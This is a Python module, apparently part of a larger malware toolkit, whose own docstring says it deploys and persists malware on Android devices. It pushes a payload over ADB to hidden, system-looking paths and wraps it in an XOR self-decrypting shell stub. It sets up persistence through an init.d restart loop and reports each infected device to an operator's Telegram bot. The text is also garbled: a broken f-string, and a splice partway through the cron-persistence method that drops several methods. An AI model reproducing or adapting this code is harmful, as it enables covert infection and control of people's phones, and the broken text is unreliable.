#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
android_deploy.py - Android deployment and persistence module
"""

import os
import sys
import subprocess
import shutil
import tempfile
import hashlib
import base64
import json
import time
import threading
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
from datetime import datetime

# Import logger
from ..utils.logger import get_logger

logger = get_logger()

class AndroidDeployer:
    """Deploys and persists malware on Android systems"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.system_info = self._get_system_info()
        
        # Telegram bot for notifications
        self.telegram_bot = None
        self.setup_telegram()
        
        # Deployment paths
        self.deploy_paths = {
            'internal_storage': '/sdcard',
            'external_storage': '/storage/emulated/0',
            'system_app': '/system/app',
            'system_priv_app': '/system/priv-app',
            'data_app': '/data/app',
            'data_data': '/data/data',
            'cache': '/data/local/tmp',
            'root': '/'
        }
        
        # ADB connection
        self.adb_path = self._find_adb()
        self.device_serial = None
        self.connected = False
        
        # Current payload
        self.payload_path = None
        self.payload_hash = None
        
        logger.info("Android deployer initialized", module="android_deploy")
    
    def setup_telegram(self):
        """Setup Telegram bot for notifications"""
        telegram_config = self.config.get('telegram', {})
        bot_token = telegram_config.get('bot_token')
        chat_id = telegram_config.get('deploy_chat_id')
        
        if bot_token and chat_id:
            try:
                from telegram import Bot
                self.telegram_bot = Bot(token=bot_token)
                self.deploy_chat_id = chat_id
                logger.info("Telegram deploy bot initialized", module="android_deploy")
            except ImportError:
                logger.warning("Telegram module not available", module="android_deploy")
            except Exception as e:
                logger.error(f"Error setting up Telegram: {e}", module="android_deploy")
    
    def send_telegram_notification(self, title: str, message: str):
        """Send deployment notification to Telegram"""
        if not self.telegram_bot or not hasattr(self, 'deploy_chat_id'):
            return
        
        try:
            full_message = fb>🤖 {b>\n\n{message}"
            self.telegram_bot.send_message(
                chat_id=self.deploy_chat_id,
                text=full_message,
                parse_mode='HTML'
            )
            logger.debug(f"Telegram deployment notification sent: {title}", module="android_deploy")
        except Exception as e:
            logger.error(f"Error sending Telegram notification: {e}", module="android_deploy")
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Get Android system information"""
        info = {
            'is_android': self._check_android(),
            'is_rooted': False,
            'sdk_version': 0,
            'manufacturer': 'Unknown',
            'model': 'Unknown',
            'android_version': 'Unknown',
            'has_adb': self.adb_path is not None
        }
        
        # Check if running on Android
        if info['is_android']:
            try:
                import android
                droid = android.Android()
                info['sdk_version'] = droid.getSdkVersion().result
                info['manufacturer'] = droid.getManufacturer().result
                info['model'] = droid.getModel().result
                info['android_version'] = droid.getAndroidVersion().result
                info['is_rooted'] = self._check_root()
            except:
                pass
        
        return info
    
    def _check_android(self) -> bool:
        """Check if running on Android"""
        try:
            # Check for Android-specific files
            android_files = [
                '/system/build.prop',
                '/system/bin/app_process',
                '/init.rc'
            ]
            
            for file in android_files:
                if os.path.exists(file):
                    return True
            
            # Check environment
            if 'ANDROID_ROOT' in os.environ:
                return True
            
            return False
            
        except:
            return False
    
    def _check_root(self) -> bool:
        """Check if device is rooted"""
        try:
            # Check for su binary
            root_checks = [
                'which su',
                'test -f /system/bin/su',
                'test -f /system/xbin/su',
                'id | grep uid=0'
            ]
            
            for check in root_checks:
                try:
                    result = subprocess.run(
                        check,
                        shell=True,
                        capture_output=True,
                        text=True
                    )
                    if result.returncode == 0:
                        return True
                except:
                    continue
            
            return False
            
        except:
            return False
    
    def _find_adb(self) -> Optional[str]:
        """Find ADB executable"""
        adb_paths = [
            'adb',
            '/usr/bin/adb',
            '/usr/local/bin/adb',
            '/opt/android-sdk/platform-tools/adb',
            os.path.join(os.environ.get('ANDROID_HOME', ''), 'platform-tools', 'adb'),
            os.path.join(os.environ.get('HOME', ''), 'Android/Sdk/platform-tools/adb')
        ]
        
        for path in adb_paths:
            try:
                result = subprocess.run(
                    [path, 'version'],
                    capture_output=True,
                    text=True
                )
                if result.returncode == 0:
                    return path
            except:
                continue
        
        return None
    
    def connect_adb(self, device_serial: str = None) -> bool:
        """Connect to Android device via ADB"""
        try:
            if not self.adb_path:
                logger.error("ADB not found", module="android_deploy")
                return False
            
            # Start ADB server
            subprocess.run([self.adb_path, 'start-server'], capture_output=True)
            
            # List devices
            result = subprocess.run(
                [self.adb_path, 'devices'],
                capture_output=True,
                text=True
            )
            
            devices = []
            for line in result.stdout.strip().split('\n')[1:]:
                if line.strip():
                    serial = line.split('\t')[0]
                    devices.append(serial)
            
            if not devices:
                logger.error("No ADB devices found", module="android_deploy")
                return False
            
            # Use specified device or first available
            if device_serial:
                if device_serial in devices:
                    self.device_serial = device_serial
                else:
                    logger.error(f"Device {device_serial} not found", module="android_deploy")
                    return False
            else:
                self.device_serial = devices[0]
            
            # Test connection
            test_result = self._run_adb_command('getprop ro.product.model')
            if test_result:
                self.connected = True
                
                # Get device info
                device_info = {
                    'model': test_result.strip(),
                    'manufacturer': self._run_adb_command('getprop ro.product.manufacturer').strip(),
                    'android_version': self._run_adb_command('getprop ro.build.version.release').strip(),
                    'sdk_version': self._run_adb_command('getprop ro.build.version.sdk').strip(),
                    'is_rooted': self._check_adb_root()
                }
                
                self.send_telegram_notification(
                    "ADB Connected",
                    f"Device: {device_info['model']}\n"
                    f"Manufacturer: {device_info['manufacturer']}\n"
                    f"Android: {device_info['android_version']}\n"
                    f"Rooted: {device_info['is_rooted']}"
                )
                
                logger.info(f"ADB connected to {self.device_serial}", module="android_deploy")
                return True
            else:
                logger.error("ADB connection test failed", module="android_deploy")
                return False
            
        except Exception as e:
            logger.error(f"ADB connection error: {e}", module="android_deploy")
            return False
    
    def _run_adb_command(self, command: str) -> str:
        """Run ADB shell command"""
        try:
            if not self.connected or not self.device_serial:
                return ""
            
            full_cmd = [self.adb_path, '-s', self.device_serial, 'shell', command]
            result = subprocess.run(
                full_cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                return result.stdout
            else:
                logger.warning(f"ADB command failed: {command} - {result.stderr}", module="android_deploy")
                return ""
            
        except Exception as e:
            logger.error(f"ADB command error: {e}", module="android_deploy")
            return ""
    
    def _push_file(self, local_path: str, remote_path: str) -> bool:
        """Push file to device via ADB"""
        try:
            if not self.connected or not self.device_serial:
                return False
            
            if not os.path.exists(local_path):
                logger.error(f"Local file not found: {local_path}", module="android_deploy")
                return False
            
            cmd = [self.adb_path, '-s', self.device_serial, 'push', local_path, remote_path]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                logger.debug(f"File pushed: {local_path} -> {remote_path}", module="android_deploy")
                return True
            else:
                logger.warning(f"File push failed: {result.stderr}", module="android_deploy")
                return False
            
        except Exception as e:
            logger.error(f"File push error: {e}", module="android_deploy")
            return False
    
    def _pull_file(self, remote_path: str, local_path: str) -> bool:
        """Pull file from device via ADB"""
        try:
            if not self.connected or not self.device_serial:
                return False
            
            cmd = [self.adb_path, '-s', self.device_serial, 'pull', remote_path, local_path]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                logger.debug(f"File pulled: {remote_path} -> {local_path}", module="android_deploy")
                return True
            else:
                logger.warning(f"File pull failed: {result.stderr}", module="android_deploy")
                return False
            
        except Exception as e:
            logger.error(f"File pull error: {e}", module="android_deploy")
            return False
    
    def _check_adb_root(self) -> bool:
        """Check if ADB device is rooted"""
        result = self._run_adb_command('su -c id')
        return 'uid=0' in result
    
    def deploy_payload(self, payload_path: str, target_path: str = None,
                      obfuscate: bool = True, hide: bool = True) -> bool:
        """Deploy payload to target system"""
        try:
            if not os.path.exists(payload_path):
                logger.error(f"Payload not found: {payload_path}", module="android_deploy")
                return False
            
            # Calculate payload hash
            with open(payload_path, 'rb') as f:
                self.payload_hash = hashlib.sha256(f.read()).hexdigest()
            
            # Determine target path
            if target_path is None:
                target_path = self._choose_deployment_path()
            
            # For ADB deployment
            if self.connected:
                success = self._push_file(payload_path, target_path)
                if success:
                    self.payload_path = target_path
                    
                    # Make executable
                    self._run_adb_command(f'chmod 755 {target_path}')
                    
                    # Apply obfuscation
                    if obfuscate:
                        self._obfuscate_payload_adb(target_path)
                    
                    # Apply hiding
                    if hide:
                        self._hide_file_adb(target_path)
            else:
                # Local deployment (running on Android)
                os.makedirs(os.path.dirname(target_path), exist_ok=True)
                shutil.copy2(payload_path, target_path)
                self.payload_path = target_path
                
                # Make executable
                os.chmod(target_path, 0o755)
                
                # Apply obfuscation
                if obfuscate:
                    self._obfuscate_payload(target_path)
                
                # Apply hiding
                if hide:
                    self._hide_file(target_path)
            
            # Send Telegram notification
            device_name = self._run_adb_command('getprop ro.product.model').strip() if self.connected else 'Local'
            
            self.send_telegram_notification(
                "Payload Deployed",
                f"Device: {device_name}\n"
                f"ADB: {self.connected}\n"
                f"Rooted: {self.system_info['is_rooted']}\n"
                f"Target: {target_path}\n"
                f"Hash: {self.payload_hash[:16]}..."
            )
            
            logger.info(f"Payload deployed to: {target_path}", module="android_deploy")
            return True
            
        except Exception as e:
            logger.error(f"Payload deployment error: {e}", module="android_deploy")
            return False
    
    def _choose_deployment_path(self) -> str:
        """Choose optimal deployment path"""
        import random
        
        if self.connected:
            # ADB deployment paths
            paths = [
                '/sdcard/Download/.system_update',
                '/data/local/tmp/.cache',
                '/storage/emulated/0/Android/data/com.android.chrome/cache',
                '/system/bin/.debuggerd',
                '/system/xbin/.busybox'
            ]
        else:
            # Local Android paths
            paths = [
                '/data/local/tmp/.update',
                '/sdcard/Android/data/.cache',
                '/storage/self/primary/Download/.temp',
                f"{self.deploy_paths['internal_storage']}/.hidden",
                f"{self.deploy_paths['cache']}/.tmp"
            ]
        
        return random.choice(paths)
    
    def _obfuscate_payload(self, file_path: str):
        """Obfuscate payload locally"""
        try:
            # Read payload
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Simple XOR obfuscation
            key = os.urandom(32)
            obfuscated = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
            
            # Create shell script that deobfuscates and executes
            stub = f"""#!/system/bin/sh
# Deobfuscation key
KEY="{key.hex()}"

# Read obfuscated payload
PAYLOAD=$(tail -c +{len(stub.encode()) + 1} "$0")

# Deobfuscate
DECRYPTED=""
i=0
while [ $i -lt $(echo -n "$PAYLOAD" | wc -c) ]; do
    CHAR=$(echo -n "$PAYLOAD" | cut -c $((i+1)))
    BYTE=$(printf "%d" "'$CHAR")
    KEY_BYTE=$((0x$(echo -n "$KEY" | cut -c $((i*2+1))-$((i*2+2)))))
    DEC_BYTE=$((BYTE ^ KEY_BYTE))
    DECRYPTED="$DECRYPTED$(printf "\\\\x%02x" $DEC_BYTE)"
    i=$((i+1))
done

# Write to temp file
TEMP_FILE="/data/local/tmp/.tmp_$(date +%s)"
echo -ne "$DECRYPTED" > "$TEMP_FILE"
chmod 755 "$TEMP_FILE"

# Execute
"$TEMP_FILE" &
rm -f "$TEMP_FILE"

exit 0

"""
            
            # Write stub + obfuscated data
            with open(file_path, 'wb') as f:
                f.write(stub.encode())
                f.write(obfuscated)
            
            # Make executable
            os.chmod(file_path, 0o755)
            
            logger.debug(f"Payload obfuscated: {file_path}", module="android_deploy")
            
        except Exception as e:
            logger.error(f"Payload obfuscation error: {e}", module="android_deploy")
    
    def _obfuscate_payload_adb(self, remote_path: str):
        """Obfuscate payload via ADB"""
        try:
            # Pull file, obfuscate locally, push back
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                tmp_path = tmp.name
            
            # Pull file
            if self._pull_file(remote_path, tmp_path):
                # Obfuscate locally
                self._obfuscate_payload(tmp_path)
                
                # Push back
                self._push_file(tmp_path, remote_path)
            
            # Cleanup
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            
        except Exception as e:
            logger.error(f"ADB payload obfuscation error: {e}", module="android_deploy")
    
    def _hide_file(self, file_path: str):
        """Hide file locally"""
        try:
            # Add dot prefix to filename
            dir_name = os.path.dirname(file_path)
            base_name = os.path.basename(file_path)
            
            if not base_name.startswith('.'):
                hidden_path = os.path.join(dir_name, f".{base_name}")
                shutil.move(file_path, hidden_path)
                self.payload_path = hidden_path
            
            logger.debug(f"File hidden: {file_path}", module="android_deploy")
            
        except Exception as e:
            logger.error(f"File hiding error: {e}", module="android_deploy")
    
    def _hide_file_adb(self, remote_path: str):
        """Hide file via ADB"""
        try:
            # Rename to add dot prefix
            dir_name = os.path.dirname(remote_path)
            base_name = os.path.basename(remote_path)
            
            if not base_name.startswith('.'):
                hidden_path = os.path.join(dir_name, f".{base_name}")
                self._run_adb_command(f'mv {remote_path} {hidden_path}')
                self.payload_path = hidden_path
            
            logger.debug(f"File hidden via ADB: {remote_path}", module="android_deploy")
            
        except Exception as e:
            logger.error(f"ADB file hiding error: {e}", module="android_deploy")
    
    def establish_persistence(self, methods: List[str] = None) -> Dict[str, bool]:
        """Establish persistence using multiple methods"""
        if methods is None:
            methods = ['init_script', 'cron', 'app', 'broadcast', 'service']
        
        results = {}
        
        logger.info(f"Establishing persistence using {len(methods)} methods", module="android_deploy")
        
        for method in methods:
            try:
                if method == 'init_script':
                    success = self._persist_via_init_script()
                elif method == 'cron':
                    success = self._persist_via_cron()
                elif method == 'app':
                    success = self._persist_via_app()
                elif method == 'broadcast':
                    success = self._persist_via_broadcast()
                elif method == 'service':
                    success = self._persist_via_service()
                else:
                    logger.warning(f"Unknown persistence method: {method}", module="android_deploy")
                    success = False
                
                results[method] = success
                
                if success:
                    logger.info(f"Persistence established via {method}", module="android_deploy")
                else:
                    logger.warning(f"Persistence failed via {method}", module="android_deploy")
                    
            except Exception as e:
                logger.error(f"Persistence error for {method}: {e}", module="android_deploy")
                results[method] = False
        
        # Send Telegram notification
        successful = sum(1 for r in results.values() if r)
        total = len(results)
        
        self.send_telegram_notification(
            "Persistence Established",
            f"Device: {self._run_adb_command('getprop ro.product.model').strip() if self.connected else 'Local'}\n"
            f"Methods: {successful}/{total} successful\n"
            f"Payload: {self.payload_path}"
        )
        
        return results
    
    def _persist_via_init_script(self) -> bool:
        """Establish persistence via init script"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="android_deploy")
                return False
            
            # Only works with root
            if not self.system_info['is_rooted'] and not self._check_adb_root():
                logger.warning("Root required for init script persistence", module="android_deploy")
                return False
            
            # Create init.d script
            init_script = """#!/system/bin/sh
# Android system init script

while true; do
    {payload} &
    sleep 60
done
""".format(payload=self.payload_path)
            
            # Write to init.d directory
            init_path = '/system/etc/init.d/99system'
            
            if self.connected:
                # Push via ADB
                with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
                    tmp.write(init_script)
                    tmp_path = tmp.name
                
                # Push to device
                success = self._push_file(tmp_path, init_path)
                
                # Make executable
                if success:
                    self._run_adb_command(f'chmod 755 {init_path}')
                
                # Cleanup
                os.remove(tmp_path)
                
                return success
            else:
                # Local write
                with open(init_path, 'w') as f:
                    f.write(init_script)
                
                os.chmod(init_path, 0o755)
                return True
            
        except Exception as e:
            logger.error(f"Init script persistence error: {e}", module="android_deploy")
            return False
    
    def _persist_via_cron(self) -> bool:
        """Establish persistence via cron (BusyBox)"""
        try:
            if not self.payload_path:
                logger.error("No payload path set", module="android_deploy")
                return False
            
            # Check if BusyBox is available
            busybox_check = self._run_adb_command('which busybox') if self.connected else subprocess.run('which busybox', shell=True, capture_output=True, text=True 'payload_hash': self.payload_hash,
            'adb_connected': self.connected,
            'device_serial': self.device_serial,
            'timestamp': datetime.now().isoformat()
        }
    
    def get_status(self) -> Dict[str, Any]:
        """Get deployer status"""
        return {
            'system': 'Android',
            'connected': self.connected,
            'rooted': self.system_info['is_rooted'],
            'adb_available': self.adb_path is not None,
            'payload_deployed': self.payload_path is not None,
            'telegram_available': self.telegram_bot is not None
        }

# Global instance
_android_deployer = None

def get_android_deployer(config: Dict = None) -> AndroidDeployer:
    """Get or create Android deployer instance"""
    global _android_deployer
    
    if _android_deployer is None:
        _android_deployer = AndroidDeployer(config)
    
    return _android_deployer

if __name__ == "__main__":
    # Test the Android deployer
    config = {
        'telegram': {
            'bot_token': 'test_token',
            'deploy_chat_id': 123456789
        }
    }
    
    deployer = get_android_deployer(config)
    
    print("Testing Android deployer...")
    print(f"Android: {deployer.system_info['is_android']}")
    print(f"Rooted: {deployer.system_info['is_rooted']}")
    print(f"ADB: {deployer.adb_path}")
    
    # Test ADB connection if available
    if deployer.adb_path:
        print("\nTesting ADB connection...")
        connected = deployer.connect_adb()
        print(f"Connected: {connected}")
    
    # Create test payload
    test_payload = os.path.join(tempfile.gettempdir(), 'test_payload.sh')
    with open(test_payload, 'w') as f:
        f.write('#!/system/bin/sh\necho "Test payload running"\n')
    
    os.chmod(test_payload, 0o755)
    
    # Test deployment (local if on Android, ADB if connected)
    print("\nTesting payload deployment...")
    deployed = deployer.deploy_payload(test_payload, obfuscate=False, hide=False)
    print(f"Payload deployed: {deployed}")
    
    if deployed:
        # Test persistence
        print("\nTesting persistence methods...")
        persistence_results = deployer.establish_persistence(['init_script', 'service'])
        print(f"Persistence results: {persistence_results}")
    
    # Get deployment info
    info = deployer.get_deployment_info()
    print(f"\nDeployment info: {info.get('payload_path')}")
    
    # Show status
    status = deployer.get_status()
    print(f"\n🤖 Android Deployer Status: {status}")
    
    # Cleanup
    print("\nCleaning up...")
    deployer.cleanup()
    
    # Remove test payload
    if os.path.exists(test_payload):
        os.remove(test_payload)
    
    print("\n✅ Android deployer tests completed!")
